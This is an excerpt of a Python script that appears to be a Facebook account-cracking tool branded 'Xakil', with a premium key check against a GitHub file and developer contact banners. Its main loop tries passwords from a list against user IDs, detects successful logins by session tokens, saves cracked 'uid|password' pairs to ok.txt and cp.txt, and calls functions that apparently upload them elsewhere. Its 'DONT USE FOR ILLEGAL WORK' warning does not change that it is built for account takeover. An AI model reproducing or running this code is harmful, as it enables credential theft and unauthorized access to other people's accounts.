...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://m.me/xark.xuckerberg"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/xark.xuckerberg")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +966530701923")
	subprocess.check_output(["am", "start", "https://wa.me/+966530701923"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/XK1L71/premium/blob/main/xakil.premium.approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[0;95m██   ██ ██   ██  ██ █████
 ...
 > \033[0;92mDEVELOPER     : XAKIL [XK1L]
 > \033[0;95mFACEBOOK ID   : ARAFAT AFIF
 > \033[0;41mWHATSAPP      : +966530701923
 \033[0;96m> YOUTUBE       : N\A
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [Xakil] : %s/%s -> \033[0;92m [ Xakil-OK:%s ]- \033[0;93m[Xakil-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [Xakil-OK😘] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[Xakil-CP😿] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [Xakil-CP😿] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
